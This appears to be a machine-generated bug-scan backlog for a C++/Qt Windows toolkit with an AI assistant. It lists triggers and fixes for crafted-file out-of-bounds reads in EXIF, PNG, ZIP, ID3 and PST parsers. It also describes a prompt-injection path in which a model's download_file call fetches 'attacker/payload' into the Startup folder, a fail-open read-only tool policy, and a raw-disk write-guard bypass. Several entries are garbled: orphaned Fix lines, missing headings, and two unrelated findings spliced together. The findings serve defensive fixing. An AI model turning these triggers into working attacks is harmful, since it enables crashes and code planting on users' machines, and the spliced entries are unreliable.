# Codex Full-Codebase Bug Scan - Confirmed Backlog (2026-07-20)

Whole-tree codex scan (gpt-5.6-sol xhigh) of all first-party C++/Qt code
(~220k lines, src/ + include/sak, excluding src/third_party and tests),
every finding adversarially re-verified by an independent skeptic reviewer
against the real tree (default REFUTED; must construct a concrete trigger).

Totals: 311 CONFIRMED (HIGH 86, MEDIUM 155, LOW 70). Refuted 20, already-fixed 9.

Severity is the verifier's adjusted value. Line numbers are approximate
(codex/verifier cited the construct, not always the exact line).

## HIGH (86)

### P07-23 [HIGH] include/sak/image_source.h:40
**Compressed-image size is indeterminate**

- Trigger: Flash a compressed image (.gz/.bz2/.xz/.zip) with verification enabled: FlashCoordinator builds a CompressedImageSource, FlashWorker::process() sets m_totalBytes = size() = the uninitialized ImageMetadata::uncompressedSize (never assigned for compressed sources). The indeterminate qint64 then feeds calculateChecksum(m_deviceHandle, m_totalBytes) at flash_worker.cpp:365 as the raw-device read length and the progress/sample math - UB producing a garbage, potentially huge or negative, byte count.
- Evidence: include/sak/image_source.h:40 declares `qint64 uncompressedSize;` with no default member initializer. FileImageSource's ctor sets it to 0 (src/core/image_source.cpp:36), but CompressedImageSource's ctor (image_source.cpp:219-238) and open() (247-293) never assign m_metadata.uncompressedSize, and the streaming decompressor never sets it. m_metadata is default-initialized (not in the ctor init list), so ImageMetadata's implicitly-defined default ctor leaves the scalar uncompressedSize indeterminate. CompressedImageSource::size() (image_source.cpp:323-325) returns that indeterminate value. Grep confirms line 36 is the ONLY assignment to m_metadata.uncompressedSize in image_source.cpp. This is reachable in production: FlashCoordinator (flash_coordinator.cpp:124,158) constructs a CompressedImageSource for compressed images and FlashWorker reads m_totalBytes = m_imageSource->size() at flash_worker.cpp:93, then uses m_totalBytes as the progress denominator (604), verify sample size (407), block count (437), and - critically - the raw-device read length in calculateChecksum(m_deviceHandle, m_totalBytes) at flash_worker.cpp:365.
- Fix: Give all ImageMetadata scalar fields in-class initializers (e.g. `qint64 uncompressedSize{0};`) and have CompressedImageSource represent an unknown streamed size explicitly (e.g. size() returns -1 / 0 for "unknown") so callers don't multiply/read by an indeterminate value.

### P08-03 [HIGH] src/ai/ai_cancellation_token.cpp:115
**Cancellation state has cross-thread data races**

- Trigger: Workflow run in flight: QtConcurrent worker (ai_assistant_panel.cpp:9160-9176 -> orchestrator.run) calls createChild on the shared State, appending to State::children (ai_cancellation_token.cpp:42) and reading cancelled/reason (37-39). User clicks Cancel -> UI thread calls m_runToken.cancel() (ai_assistant_panel.cpp:10280) -> cancelState writes cancelled/reason/cancelled_at_utc (115-117) and copies+iterates State::children (119) on the SAME State object. Concurrent non-atomic bool + implicitly-shared QString + QVector append-vs-copy with no lock = C++ UB: corrupted QVector storage, crash, or lost cancellation.
- Evidence: State struct (include/sak/ai/ai_cancellation_token.h:35-42) has bool cancelled, QString reason, QDateTime, QVector<weak_ptr<State>> children with NO mutex/atomic. Worker thread reaches createChild/isCancellationRequested through QtConcurrent::run at ai_assistant_panel.cpp:9142(token copy shares State),9160-9161,9176; orchestrator.cpp:405 and subagent_runner.cpp:76 call createChild on the worker. UI thread mutates the same State via cancel()->cancelState at ai_cancellation_token.cpp:108-123 from ai_assistant_panel.cpp:10280 and :3416. No synchronization exists anywhere; not guarded.
- Fix: Add a mutex to State (or make cancelled an atomic and guard reason/children/cancelled_at_utc under a lock). In cancelState and createChild/childCount/toJson, take the lock; copy child weak_ptrs under lock before recursing/propagating.

### P08-01 [HIGH] src/ai/ai_conversation_store.cpp:1011
**Artifact filename permits arbitrary file overwrite**

- Trigger: Model emits a download_file tool call (e.g. via prompt injection from fetched web content) with url="https://attacker/payload" and filename="C:/Users/Username/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/payload.cmd". safeDownloadFileName (ai_assistant_panel.cpp:1997) returns that absolute path unchanged; artifactPath (ai_conversation_store.cpp:1011) does QDir(downloadsDir).filePath(absPath), which Qt returns verbatim for absolute paths; writeDownloadBytes (line 2085) opens it WriteOnly|Truncate and writes the attacker bytes, planting an autostart payload outside the artifact dir. A relative filename like "../../../../foo" escapes identically since filePath does not collapse '..'.
- Evidence: ai_conversation_store.cpp:1004-1012 artifactPath returns QDir(dir).filePath(filename) with no canonical-path confinement. Caller chain: ai_assistant_panel.cpp:8207-8208 passes model-controlled args["filename"] into runDownloadTool; runDownloadTool (6116) sanitizes via safeDownloadFileName (1997-2008) which only trims/empty-fallbacks and never rejects absolute paths or '..'; writeDownloadBytes (2081-2099) opens destination with QIODevice::WriteOnly|Truncate. Qt QDir::filePath returns absolute paths verbatim and does not resolve/reject '..', so no confinement exists. No basename extraction, no canonicalPath containment check anywhere in the path.
- Fix: In safeDownloadFileName reduce to basename only (QFileInfo(safe_name).fileName()) and reject empty/dotted results; additionally in artifactPath verify QFileInfo(result).canonicalFilePath() (or cleanPath) still begins with the canonical artifact subdir before returning.

### P08-02 [HIGH] src/ai/ai_conversation_store.cpp:886
**Case-only title rename deletes all session artifacts**

- Trigger: An AI session titled 'Foo' that has generated artifacts under artifacts/Foo/ (e.g. command logs). User invokes renameCurrentSession('foo') (case-only change). old='Foo', new='foo' differ case-sensitively so processing proceeds; both paths map to the same NTFS directory; the else-branch mergeDirectoryContents(Foo, foo) runs and its trailing removeRecursively(Foo) deletes the shared directory, wiping all artifacts.
- Evidence: src/ai/ai_conversation_store.cpp:875-889 (renameCurrentSession) + mergeDirectoryContents:227-251. safeArtifactDirectoryName (1239-1253) sanitizes but does not case-fold, so title 'Foo'->'foo' yields old_artifact_name='Foo' != new='foo' (case-sensitive compare at 875), passing the guard. On case-insensitive NTFS both resolve to the same physical directory: QDir(old_path).exists() true (879), and QDir(new_path).exists() also returns true (same dir) so the !exists rename branch is skipped and the else-if at 886 calls mergeDirectoryContents(Foo, foo). Merge moves files to unique names within that same shared directory (uniqueDestinationPath/moveFileWithCopyFallback 156-205), then line 249 QDir(source_path).removeRecursively() deletes the shared directory, destroying every artifact. No canonical-path or case-insensitive equivalence check guards this.
- Fix: Before merging/removing, compare QFileInfo(old_path).canonicalFilePath() to QFileInfo(new_path).canonicalFilePath() (or a case-insensitive compare on Windows); if canonically equal, treat as an in-place title change only (update manifest) and never call mergeDirectoryContents/removeRecursively on the source.

### P08-04 [HIGH] src/ai/ai_tool_policy.cpp:304
**Read-only policy fails open for mutating PowerShell commands**

- Trigger: Policy=ReadOnlyPc; run_powershell tool call with command_preview="Move-Item C:\\Users\\Username\\important.txt D:\\trash\\" (or "Rename-Item C:\\Users\\Username\\important.txt gone.txt"), requires_admin=false. commandLooksRiskyChange returns false -> context.risky=false -> evaluateReadOnlyPolicy returns allowed=true, requires_lease=false. User data is moved/renamed/overwritten under a read-only policy with no lease and no restore point.
- Evidence: commandLooksRiskyChange (src/ai/ai_tool_policy.cpp:301-307) is a blacklist regex and is the ONLY shell gate for ReadOnlyPc (policyContext line 161 feeds evaluateReadOnlyPolicy line 183). The regex alternatives cover remove-/clear-/set-/new-/disable-/enable-/delete/del/erase/rd/rmdir/format/reset/uninstall/install/etc., but contain NO 'rename', 'move', 'move-', or 'rename-' token. Therefore 'Rename-Item' and 'Move-Item' (and also Copy-Item, Add-Content, Out-File) do not match, so commandLooksRiskyChange returns false. In policyContext, context.risky = requires_admin || (shell && false) || mutating_package(false) || mutatingProvider(false) => false. evaluateReadOnlyPolicy (line 183) then sees risky=false and shell=true, skipping the block at line 188 and returning allow('Read-only tool allowed') with no risky_change/requires_lease/restore_point. Mutating file operations execute under the read-only lease.
- Fix: Blacklist is fail-open. Either add rename-/move-/copy-/add-content (and other mutating verbs) to the regex, or invert to an allowlist of proven read-only cmdlets (Get-*, Test-Path, Select-*, Measure-*, etc.) and treat anything unmatched as risky/mutating.

### P04-03 [HIGH] src/core/advanced_search_worker.cpp:946
**Malformed EXIF offsets cause out-of-bounds reads**

- Trigger: A scanned JPEG with an APP1 Exif IFD0 entry: type=RATIONAL(5, unit_size 8), count=1 (total_bytes=8 > inline 4), value-offset field = 0xFFFFFFFF. Then offset+total_bytes = 0xFFFFFFFF+8 wraps to 7, static_cast<int>(7) <= data_size passes, and base + 0xFFFFFFFF is dereferenced by extractExifRational -> multi-GB out-of-bounds read, crashing the search worker (and leaking read bytes into displayed metadata).
- Evidence: resolveExifValuePtr at src/core/advanced_search_worker.cpp:928-932 reads attacker-controlled `offset = readU32(entry+8)` and guards only with `static_cast<int>(offset + total_bytes) > data_size`. The addition is uint32_t (wraps) and the result is cast to int (values >= 0x80000000 go negative), so a large offset passes the check and `return base + offset` produces a wild pointer. total_bytes = count*unit_size (line 974) is likewise unchecked uint32_t (count is a raw readU32 at line 961). readU32 (line 694) does raw unbounded reads, and the returned value_ptr is dereferenced in extractExifValue/extractExifRational (reads up to 8 bytes for RATIONAL) outside the tiffData buffer. No other validation exists.
- Fix: In resolveExifValuePtr and at line 974, compute bounds in qsizetype/uint64_t and validate: reject if unit_size==0, if (qsizetype)count*unit_size overflows or exceeds data_size, and if (qsizetype)offset + total_bytes > data_size (no cast-to-int, no uint32 wrap). Also range-check offset >= 0 && offset <= data_size before adding.

### P04-04 [HIGH] src/core/advanced_search_worker.cpp:1107
**Large PNG chunk length creates a negative offset**

- Trigger: A .png file with the valid 8-byte signature followed by a chunk whose 4-byte length field is bytes 0x80 0x00 0x00 0x00 and a chunk type other than "IEND". First loop iteration skips the guarded mid(), then offset += 12 + INT_MIN makes offset far negative; the next iteration calls readBE16(fileData.constData() + offset) reading ~2GB before the buffer, crashing the search worker.
- Evidence: advanced_search_worker.cpp:1107 narrows the full 32-bit PNG chunk_len (uint32_t, lines 1103-1105) to signed int. A declared length >= 0x80000000 becomes negative. The mid() at line 1114 is guarded by `chunk_len_int > 0`, but the offset advance at line 1122 `offset += kPngChunkOverheadBytes + chunk_len_int;` is NOT guarded: with chunk_len_int negative, offset (start 8) goes far negative (~-2147483628). The loop condition at 1102 `offset + 12 <= fileData.size()` remains true, so line 1103 `readBE16(fileData.constData() + offset)` dereferences a pointer ~2GB before the buffer -> out-of-bounds read/crash. Reachable via extractPngMetadata during untrusted-file metadata search. No bounds/remaining-byte validation exists.
- Fix: Keep chunk_len as unsigned qsizetype and validate `offset + kPngChunkOverheadBytes + chunk_len <= fileData.size()` before use and before advancing offset; break out of the loop on any chunk that would exceed remaining bytes.

### P04-05 [HIGH] src/core/advanced_search_worker.cpp:1390
**ZIP sizes can drive both parsers before the buffer**

- Trigger: Run advanced search over a crafted .zip/.docx/.odt/.epub whose first local file header has the compressed-size field (bytes at offset+18) set to 0x80000000. entry_size narrows to INT_MIN, next offset/offset becomes ~ -2^31, and the subsequent isZipLocalFileHeader/readU16 dereferences constData() + (negative) far before the QByteArray -> out-of-bounds read / crash (DoS) in the search worker thread.
- Evidence: advanced_search_worker.cpp: both ZIP parsers narrow uint32 compressed-size to int without a lower-bound/remaining-buffer check. (1) extractZipXmlMetadata line 1390 `entry_size = static_cast<int>(comp_size)`; the guard at 1394 `data_start + entry_size <= data_size` PASSES for negative entry_size, and line 1402 `offset = data_start + entry_size` is unconditional, so offset goes large-negative; next loop iteration calls isZipLocalFileHeader(fileData, offset) (line 1294 data[offset+..]) and readU16(constData()+offset+26) -> OOB read before buffer. (2) readArchiveEntry line 1720 `entry_size = static_cast<int>(compSize)`, 1721 next_offset = data_start + entry_size; loop line 1863 offset = next_offset; guard 1697 `offset + kZipLocalHeaderSize > data_size` checks only the upper bound, so a negative offset passes and isZipLocalFileHeader dereferences constData()+negative -> OOB read. Read caps (kMaxArchiveSize/kMaxZipMetadataRead) do not help because comp_size is an attacker-controlled header field.
- Fix: Use qsizetype offsets and reject comp_size that exceeds the remaining buffer (and require offset >= 0) in both extractZipXmlMetadata and readArchiveEntry before computing data_start/next_offset.

### P04-06 [HIGH] src/core/advanced_search_worker.cpp:1505
**Malformed ID3 frame size produces negative parser offsets**

- Trigger: A ~40-byte MP3/file starting with "ID3", version+flags bytes, a synchsafe tag size big enough that maxOffset>20, then at offset 10 frame id "TIT2" followed by frame-size bytes 0x80 0x00 0x00 0x00. extractMp3Metadata advances offset to a negative value and readId3FrameSize performs an out-of-bounds read before the buffer.
- Evidence: advanced_search_worker.cpp:1505 canReadId3Frame narrows uint32 frame_size via static_cast<int>: a frame size 0x80000000 (readId3FrameSize at 1468 reads a plain 32-bit BE value with no synchsafe mask) becomes INT_MIN, so 'offset+10+INT_MIN > max_offset' is false and the guard wrongly returns true. Line 1573 'offset += kId3FrameHeaderSize + static_cast<int>(frameSize)' then makes offset deeply negative; the while at 1561 stays true, and the next readId3FrameSize (1470) indexes file_data[negativeOffset+4] out of bounds. shouldCaptureId3Frame's <1000 check only gates capture, not offset advancement, so it does not prevent the OOB.
- Fix: In canReadId3Frame and the offset advance, keep the arithmetic in uint64/qsizetype and use subtraction-based bounds checks (e.g. frame_size > max_offset - offset - kId3FrameHeaderSize) instead of narrowing frame_size to int.

### P07-08 [HIGH] src/core/diagnostic_controller.cpp:211
**Repeated scans race and can outlive their scanner**

- Trigger: Start a Full Suite (onRunFullSuiteClicked). While it is in the HardwareScan step (background scanner->scan() running WMI queries), the still-enabled "Rescan Hardware" button is clicked -> onRescanHardwareClicked -> runHardwareScan() reassigns m_hw_scan_future, orphaning the first future. Two threads now run scan() on the same HardwareInventoryScanner (data race); if the controller is destroyed (app close / panel teardown) while the orphaned first future is still executing, cancelCurrent() waits only for the second future and the scanner unique_ptr is freed under the running first lambda -> use-after-free crash. Same race occurs in reverse: click Rescan Hardware, then click the (non-disabled) Run Full Suite button.
- Evidence: diagnostic_controller.cpp:208-220 runHardwareScan/runSmartAnalysis have NO running guard (unlike runCpuBenchmark etc. which check isRunning()); each does `m_hw_scan_future = QtConcurrent::run(...)` unconditionally, overwriting the prior QFuture<void> (header lines 257-258). cancelCurrent()/~DiagnosticController (199-202, 284-290) wait only on the current future, so an overwritten future is never joined while its lambda still calls scanner->scan() on the unique_ptr-owned scanner freed at destruction -> use-after-free, plus a live data race on the shared scanner while both run. Reachable because GUI entry paths don't mutually exclude: onRescanHardwareClicked (slots.cpp:52) calls setOperationRunning(true) which disables the individual scan buttons but NOT m_suite_run_button; onRunFullSuiteClicked (slots.cpp:470-501) disables m_suite_run_button but never calls setOperationRunning, and onSuiteStateChanged (slots.cpp:521) leaves m_hw_rescan_button/m_smart_rescan_button enabled. HardwareInventoryScanner::scan() is a multi-second WMI walk, so the overlap window is real.
- Fix: Add a busy guard in runHardwareScan/runSmartAnalysis (e.g. `if (m_hw_scan_future.isRunning()) return;`) and mutually disable the suite-run and individual-scan buttons in setOperationRunning/onRunFullSuiteClicked so both entry paths exclude each other; alternatively serialize onto the scanner's own reentrancy check.

### P05-16 [HIGH] src/core/eml_writer.cpp:59
**Raw bodies are mislabeled quoted-printable**

- Trigger: Export an email whose plain-text body contains the literal string "x=20y" (or any URL query like "?id=20"). buildEmlContent -> appendSimplePlainMessage writes it verbatim under the quoted-printable label. Opening the resulting .eml in any RFC-2045-compliant MIME reader decodes "=20" to a space, yielding "x y", corrupting the exported content. Likewise a body line ending in '=' becomes a soft line break and is silently joined to the next line.
- Evidence: src/core/eml_writer.cpp:59 (appendSimplePlainMessage) and :71 (appendBodyPart) both emit "Content-Transfer-Encoding: quoted-printable", but the body is written as raw bytes via eml.append(body.toUtf8()) at lines 61 and 73 with no QP encoding. There is no quoted-printable encoder in the file and no escaping of '=' or high bytes. Per RFC 2045 s6.7 a conformant reader treats '=' as the QP escape, so unencoded body content is decoded incorrectly. Raw UTF-8 bytes >0x7F are also illegal under a QP label.
- Fix: Either declare "Content-Transfer-Encoding: 8bit" (bodies are already raw UTF-8 with CRLF), or implement an actual quoted-printable encoder before emitting. 8bit is the minimal correct fix for both appendSimplePlainMessage and appendBodyPart.

- Fix: Have runNetsh return the full ProcessResult (or a success bool) and require result.succeeded()/exit_code==0 per command instead of substring-scanning stdout for 'error'.

### P04-11 [HIGH] src/core/file_hash.cpp:217
**Read errors become hangs or successful partial hashes**

- Trigger: Hash a file on removable/network media (or a disk with a bad sector) that throws a read error partway through. In the alternate case where the engine flags atEnd() after the fault, the loop exits and calculateMd5/calculateSha256 return a valid-looking hex digest computed over only the readable prefix, reported as success (silently wrong hash).

The helper returns void, and both callers calculateMd5 (lines 117-128) and calculateSha256 (lines 153-168) check only stop_token.stop_requested(), never file.error(), before returning hash.result() as success. Nothing guards the I/O-error path.

### P05-30 [HIGH] src/core/msg_writer.cpp:272
**Small MSG streams are stored in the wrong allocation system**

A spec-compliant CFB reader (Microsoft Outlook / IStorage, Apache POI POIFS, MAPI) sees size < cutoff, treats the directory entry's starting sector as a mini-sector index into the Root Entry mini stream, finds no mini FAT / empty mini stream, and reads the subject/body/property streams as empty or errors out opening the file.
- Evidence: msg_writer.cpp:317 writes kMiniStreamCutoff=4096 into the header; lines 319/321 set First mini FAT sector=ENDOFCHAIN and Total mini FAT sectors=0; line 175 builds Root Entry with start_sector=0,size=0 (no mini-stream container). writeDataSectors (line 272) and buildFatEntries (231-259) place EVERY stream in the regular 512-byte FAT, and buildDirectoryData (182-186) records each stream's regular-FAT sector as its directory startSector. No mini-FAT/mini-stream allocation path exists anywhere in the writer. Per MS-CFB a stream below the 4096 cutoff must reside in the mini stream and its directory startSector is interpreted as a mini-sector index; here all real MSG streams (subject, body, __properties_version1.0) are sub-cutoff and thus stored/referenced in the wrong allocation domain.
- Fix: Implement mini-FAT + mini-stream allocation: pack all sub-4096-byte streams into 64-byte mini sectors held in a real-FAT-backed mini stream owned by the Root Entry (set Root Entry startSector/size to that container), build a mini FAT chain, and set the header's First mini FAT sector / Total mini FAT sectors. ### P05-31 [HIGH] src/core/msg_writer.cpp:174
**Directory tree exposes only the first stream**

- Trigger: Convert any PST item with a non-empty subject or body (or any attachment), e.g. subject "Hello" and body "World". collectMessageStreams yields streams = [__properties_version1.0, subject(0037001F), body(1000001F)]. buildDirectoryData sets Root.child=1 (the __properties entry) and gives that entry no siblings, while the subject/body entries (indices 2,3) are only reachable via a right-sibling chain whose head (index 2) has no parent link. A conformant CFB/MSG reader traverses Root.child and finds only __properties_version1.0; the subject and body streams are invisible, producing an .msg whose content cannot be read by Outlook.
- Evidence: src/core/msg_writer.cpp:169-194 buildDirectoryData. DirEntryLinks struct order (msg_writer.h:40-44) is {child_id, left_id, right_id}. Root entry (line 174-175) is built with {child_id=1, ...}, so Root.child points to directory entry index 1 = stream[0] = __properties_version1.0. In the stream loop (177-187) each stream i lives at directory entry index i+1 and gets links {-1,-1,right} where right = i+2 only when (i>0 && i<size-1). For i=0 (the __properties entry at index 1) the guard `i > 0` forces right = -1, so that entry has left=-1, right=-1, child=-1. Since Root.child targets exactly that node, a spec-compliant CFB red-black-tree walk terminates after visiting only __properties_version1.0. The forward right-sibling chain begins at entry index 2 (i=1 -> right=3, etc.) but nothing ever links to index 2, so entries 2..N (subject, body, attachments) are orphaned/unreachable. Per MS-CFB, children must form a traversable sibling tree, so a compliant reader (e.g. Outlook) cannot find any stream except the properties stream.
- Fix: Build a proper sorted sibling tree over ALL stream entries. Minimal fix: drop the `i > 0` guard so stream[0] also receives a right sibling (right = i+2 for all i < size-1), making the chain entry1->entry2->...->entryN reachable from Root.child. Better: emit a balanced red-black sibling tree keyed by the MS-CFB name ordering (uppercased UTF-16 length-then-codepoint compare) and set colors accordingly.

### P02-03 [HIGH] src/core/partition_ext_file_system_reader.cpp:860

Reading that file: the extent is decoded as length 0 + uninitialized, so all 32768 logical blocks (128 MiB) fail to map and read back as zeros/missing instead of the file's real contents. Correct decode: treat 0x8000 as initialized length 32768; only rawLength>32768 is unwritten with length rawLength-32768.

Per ext4 spec (kernel docs), ee_len<=32768 means initialized with actual length ee_len; ee_len>32768 means unwritten with length ee_len-32768. The mask is correct for 1..32767 (length=raw, init=true) and 32769..65535 (length=raw-32768, init=false), but WRONG for exactly ee_len==0x8000 (32768): masking gives length 0 and initialized=false, so the maximum-size initialized extent is dropped. physicalBlockFromExtents (lines 886-893) uses logical < logical_start + length, which with length 0 never matches, so readLogicalDataBlock returns missing/zero data for that 32768-block region. - Fix: Replace the bit-mask decode with: initialized = rawLength <= 32768; length = initialized ? rawLength : (rawLength - 32768).

- Trigger: In the Copy Partition Wizard select "Image or custom volume/device path", type a raw volume/device alias such as \\.\D: (or \\.\C:) into the free-text Target path field (partition_manager_panel.cpp:7760/7805-7823), check the overwrite-confirmation box, and Apply. onCopyPartitionWizard (line 10870-10883) queues a ClonePartition op with target_path=\\.\D: and no target_disk_number. In validatePayloadRawWriteTarget, targetPhysicalDriveNumber -> physicalDriveNumberFromPath returns nullopt because the path does not start with \\.\PhysicalDrive, so line 1848-1850 returns before isUnsafeRawWriteTargetDisk (system/boot/read-only/dynamic/Storage Spaces) runs. No other blocker requires the raw target to resolve to a PhysicalDrive. The generated clone script's Assert-SakRawWriteTarget likewise returns $null for non-PhysicalDrive paths and skips the IsBoot/IsSystem/IsReadOnly/Spaces guards, then Open-SakWrite $dst writes raw bytes to \\.\D:.
- Evidence: partition_safety_validator.cpp:449-463 physicalDriveNumberFromPath matches only the literal \\.\PhysicalDrive prefix; any other raw path -> nullopt. validatePayloadRawWriteTarget (line 1847-1850) early-returns when targetPhysicalDriveNumber has no value, so isUnsafeRawWriteTargetDisk (line 999-1002) never runs for volume/device aliases. The Copy Partition Wizard exposes a free-text custom volume/device Target path (partition_manager_panel.cpp:7760, 7805-7823) that flows unmodified into a ClonePartition payload (line 10870-10883). None of the ClonePartition blockers close the gap: clonePartitionPhysicalTargetMissingRegion (line 931) needs a PhysicalDrive path; clonePartitionRegionMissingFields (line 920) needs a selected region; requiresPartitionCloneTargetConfirmation (line 945) is satisfied by the checkbox. The runtime guard is bypassed identically: Assert-SakRawWriteTarget (partition_script_builder.cpp:2141-2146) returns $null via Get-SakPhysicalDriveNumber for non-PhysicalDrive paths, skipping the boot/system/read-only/Spaces throws, then cloneTransferExecutionScript Open-SakWrite $dst (line 2154-2157) writes raw bytes to the alias. Mitigating factors: requires user-typed alias plus destructive-overwrite confirmation, and Windows blocks raw writes to online mounted-volume sectors; offline/unmounted volumes and other device aliases remain exposed.
- Fix: Resolve every raw-write target handle (any \\.\ path, not just \\.\PhysicalDriveN) to its owning physical disk before validating, and fail closed: if a raw target cannot be resolved to a known inventory disk whose system/boot/read-only/dynamic/Storage Spaces state can be checked, block the operation. Mirror the same resolution + reject-on-unresolvable in Assert-SakRawWriteTarget instead of returning $null.

### P05-46 [HIGH] src/core/pst_parser.cpp:1466
**XBLOCK entry count permits out-of-bounds reads**

- Trigger: A Unicode PST whose BBT entry for an internal (fInternal) bid points to a block with cb=8 (header only) but whose cEnt field at offset 2 = 0xFFFF, and cLevel = kDataTreeXBlockLevel. readDataTree passes the 8-byte check, then readXblockChildren loops 65535 times calling readLE<uint64_t> at offsets 8, 16, ... up to ~524272 into an 8-byte QByteArray buffer, producing repeated heap out-of-bounds reads (crash / potential info disclosure) in a release build.
- Evidence: src/core/pst_parser.cpp:1461-1487 (readXblockChildren) and 1489-1512 (readXxblockChildren). In readDataTree (line 1437) the ONLY size check is `data.size() < kBlockTreeHeaderSize` (8 bytes). It then reads `entry_count = readLE<uint16_t>(data, 2)` (line 1442, range 0..65535) and passes it unchecked into readXblockChildren, whose loop `for (idx=0; idx<entry_count; ++idx)` computes `offset = kBlockTreeHeaderSize + idx*bid_size` (bid_size=8 unicode) and calls `readLE<uint64_t>(data, offset)` (line 1468) with NO check that `offset + sizeof(T) <= data.size()`. readLE (line 2850-2857) bounds-checks only via `Q_ASSERT(offset + sizeof(T) <= data.size())`, which compiles to a no-op under QT_NO_DEBUG (all release builds), leaving a raw `std::memcpy(&value, data.constData()+offset, sizeof(T))` that reads past the QByteArray heap allocation. `cb`/`entry.cb` (readBlock line 1386-1393) is the block byte length from the BBT and is independent of the in-block cEnt field, so a corrupt/crafted PST can present a small block with a large count. No cross-validation of entry_count against block length exists in this path.
- Fix: In readDataTree, before dispatching, reject when `kBlockTreeHeaderSize + entry_count*bid_size > data.size()` using overflow-safe arithmetic (compute bid_size for the current unicode/ansi mode), returning pst_corrupted_btree. The same guard is needed for the subnode tree path at line 2113.

### P05-48 [HIGH] src/core/pst_parser.cpp:1914
**Large row index becomes a negative vector index**

- Trigger: A crafted PST whose TC row-index BTH leaf contains a TCROWID record with dwRowIndex >= 0x80000000 (e.g. 0x80000000). extractTcRowIndicesFromLeaf (pst_parser.cpp:1962-1963) reads it verbatim as uint32_t and buildTcRows (1871) passes it to tcRowOffset. At line 1914 static_cast<int>(0x80000000) = INT_MIN, so block_i = INT_MIN/rows_per_block (large negative). The guard at 1916 (block_i >= block_count) is upper-bound only and a negative value passes, so line 1919 matrix.block_ends[block_i - 1] and line 1920 matrix.block_ends[block_i] perform negative-index out-of-bounds reads on the QVector<int> block_ends.
- Evidence: tcRowOffset at src/core/pst_parser.cpp:1906-1926 casts the untrusted uint32_t row_index to int (line 1914) and only checks the upper bound block_i >= block_count (line 1916); there is no block_i < 0 (nor row_index range) check. block_ends is QVector<int> (include/sak/pst_parser.h:295). row_index originates from unvalidated file bytes via readLE<uint32_t> in extractTcRowIndicesFromLeaf (line 1963). Negative block_i reaches matrix.block_ends[block_i - 1] (line 1919) and matrix.block_ends[block_i] (line 1920) as negative indices -> OOB read.
- Fix: Reject block_i < 0 (and row_index >= block_count*rows_per_block) before indexing; do range math in unsigned/64-bit. E.g. compute block_i as uint64_t and bail if block_i >= static_cast<uint32_t>(block_count) or if the derived index is negative.

### P05-51 [HIGH] src/core/pst_splitter.cpp:129
**Volume rotation recreates children before parents**

- Trigger: Convert an OST/PST containing a >=2-deep folder path (e.g. "Inbox/Projects") whose accumulated content exceeds m_max_size, forcing rotateVolume(). When QHash iteration visits the child "Projects" before its parent "Inbox", m_folder_nid_map lacks Inbox, so Projects is recreated in the new volume under Inbox's stale volume-1 NID; in the new volume that NID either does not exist or maps to a different folder, so Projects (and any messages later written to it via the remap) is orphaned/misattached.
- Evidence: src/core/pst_splitter.cpp:129 iterates m_folder_info, declared QHash<uint64_t,FolderInfo> in include/sak/pst_splitter.h:72 (unordered). Parent remap at lines 133-135 only substitutes the new-volume NID when the parent is already in m_folder_nid_map; if a child is visited before its parent, the stale volume-1 parent_nid is passed to createFolder for the new volume. PstWriter::createFolder (src/core/pst_writer.cpp:168-178) never validates the parent and always returns a value, so new_nid.has_value() stays true and the error is silent. Each volume restarts m_next_nid from the same base, so the stale old NID can collide with a DIFFERENT folder in the new volume -> misattachment (matches the report). Nested folders are really created via OstConversionWorker::ensurePstFolderHierarchy (src/core/ost_conversion_worker.cpp:449-467), where a folder's parent_nid is another dynamically-allocated folder NID. Top-level folders (parent == constant kNidRootFolder 0x122) are unaffected; folders nested >=2 deep are the trigger. No topological ordering or fail-on-error guard exists.
- Fix: Recreate folders in parent-before-child (topological) order and treat a missing parent mapping as a hard error that fails the rotation, rather than silently passing the old NID.

### P05-52 [HIGH] src/core/pst_writer.cpp:258
**Writer cannot produce a mountable PST**

- Trigger: Export any mailbox to PST (e.g. OST->PST via ost_conversion_worker/email_export_worker, or the test flow: PstWriter::create() -> createFolder() -> writeMessage() -> finalize()), then open the resulting .pst in Outlook or run scanpst.exe. The file is rejected as not a valid personal-folders file because there is no discoverable NBT/BBT and no ROOT.
- Evidence: pst_writer.cpp writeHeader() (225-269) serializes fields only up to dwUnique (256), then writes rgnid as 128 dwords = 512 bytes (258-262, kPstHeaderReservedDwords=128) whereas [MS-PST] 2.2.2.6 defines rgnid as 128 bytes (rgnid[32]); it then STOPS, never emitting qwUnused, the ROOT structure (ibFileEof/BREFNBT/BREFBBT/fAMapValid), bSentinel, bidNextB, or dwCRCFull. finalize() (190-211) re-calls the same writeHeader(), so no NBT/BBT root BREF is ever written despite the comment. updateNodeBTree()/updateBlockBTree() (310-354) write raw leaf entries into a 512-byte page with no BTPAGE trailer/pageTrailer (cEnt/cEntMax/cbEnt/cLevel/ptype/wSig/dwCRC/bid), and nothing references those pages. allocateBlock (281-308) writes blocks with no BLOCKTRAILER; buildPropertyContext (360-390) is a non-conformant HN/BTH simplification. Tests (test_pst_writer.cpp) only assert 4-byte magic and size>0 - no conformant round-trip - so nothing guards mountability. Path is reachable from email_export_worker.cpp and ost_conversion_worker.cpp. The finding's three claims (oversized rgnid, missing ROOT, page-metadata-less pseudo-B-tree with no header root pointers) are all true in current code.
- Fix: Implement a spec-conformant Unicode PST header (correct 128-byte rgnid, real ROOT with BREFNBT/BREFBBT/ibFileEof, bidNextB, dwCRCPartial/dwCRCFull), emit proper BTPAGE pages with pageTrailer for NBT/BBT, add BLOCKTRAILER to each block, and build real HN/BTH/PC/TC structures; validate output with an independent MS-PST reader (e.g. libpff/scanpst) in tests rather than only checking the magic bytes.

### P06-12 [HIGH] src/core/quick_action_controller.cpp:425
**Completion connections accumulate across runs**

- Trigger: Call scanAllActions() twice (it re-queues every registered action each call), or execute the same action A twice with another action B queued. On the second run of A, A holds 2 live scanComplete/executionComplete connections. When A completes, the first onScanComplete/onExecutionComplete dequeues B and starts its worker (m_current becomes B); the second, stale invocation then treats B as complete, emits its completion signal early, and blocks the GUI thread in thread->wait() on B's freshly-started worker before deleting it.
